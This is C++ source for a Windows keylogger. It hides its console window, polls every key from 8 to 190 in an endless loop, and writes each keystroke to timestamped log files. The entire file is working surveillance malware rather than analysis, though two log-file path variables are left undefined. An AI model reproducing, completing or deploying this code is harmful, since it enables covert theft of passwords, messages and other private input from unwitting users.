#include <windows.h> 
#include <winuser.h>

#include <iostream>
#include <ctime>
#include <string>

using namespace std;

const bool HIDDEN_WINDOW = true;

int Save (int key_stroke, char *file, char *raw_file);
void AddNewSection(char * file);
void Stealth();

int main()
{
	Stealth();
	char i;

	char * file = logfile_decorated;
	char * file_raw = logfile_raw;

	AddNewSection(file);
	AddNewSection(file_raw);

	while (1)
	{
		for(i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767){
				Save (i, file, file_raw);
			}
		}
	}
	system ("PAUSE");
	return 0;
}

template<typename T>
void my_print(FILE *OUTPUT_FILE, string format, T value){
	fprintf(OUTPUT_FILE, format.c_str(), value);
	// cout << "\t\tvalue: " << value;
}

/* *********************************** */

int Save (int key_stroke, char *file, char *raw_file)
{
	if ( (key_stroke == 1) || (key_stroke == 2) )
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout <<"stoke: " << key_stroke;

	if (key_stroke == 8){
		my_print(OUTPUT_FILE, "%s", "[BACKSPACE]"); 
	}
	else if (key_stroke == 13){
		my_print(OUTPUT_FILE, "%s", "\n");
	}
	else if (key_stroke == 32){
		my_print(OUTPUT_FILE, "%s", " ");
	}
	else if (key_stroke == VK_TAB) {
		my_print(OUTPUT_FILE, "%s", "[TAB]");
	}
	else if (key_stroke == VK_SHIFT){
		my_print(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (key_stroke == VK_CAPITAL){
		my_print(OUTPUT_FILE, "%s", "[CAPS]");
	}
	else if (key_stroke == VK_CONTROL){
		my_print(OUTPUT_FILE, "%s", "[CONTROL]");
	}
	else if (key_stroke == VK_ESCAPE){
		my_print(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else if (key_stroke == VK_END){
		my_print(OUTPUT_FILE, "%s", "[END]");
	}
	else if (key_stroke == VK_HOME){
		my_print(OUTPUT_FILE, "%s", "[HOME]");
	}
	else if (key_stroke == VK_LEFT){
		my_print(OUTPUT_FILE, "%s", "[LEFT]");
	}
	else if (key_stroke == VK_UP){
		my_print(OUTPUT_FILE, "%s", "[UP]");
	}
	else if (key_stroke == VK_RIGHT){
		my_print(OUTPUT_FILE, "%s", "[RIGHT]");
	}
	else if (key_stroke == VK_DOWN){
		my_print(OUTPUT_FILE, "%s", "[DOWN]");
	}
	else if (key_stroke == 190 || key_stroke == 110){
		my_print(OUTPUT_FILE, "%s", ".");
	}
	else{
		my_print(OUTPUT_FILE, "%c", (char)key_stroke);
	}

	cout << endl;

	fclose (OUTPUT_FILE);

	OUTPUT_FILE = fopen(raw_file, "a+");
	fprintf(OUTPUT_FILE, " %d", key_stroke);
	fclose(OUTPUT_FILE);

	return 0;
}

/* *********************************** */

void AddNewSection(char * file){
	time_t rawtime;
	struct tm * timeinfo;
	char buffer[80];

	time (&rawtime);
	timeinfo = localtime(&rawtime);

	strftime(buffer,sizeof(buffer),"%d-%m-%Y %I:%M:%S",timeinfo);


	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "\n\n------------- start at %s-------------\n\n", buffer);
	fclose(OUTPUT_FILE);
}

/* *********************************** */

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	if(HIDDEN_WINDOW) ShowWindow(Stealth,0);
	else ShowWindow(Stealth,1);
}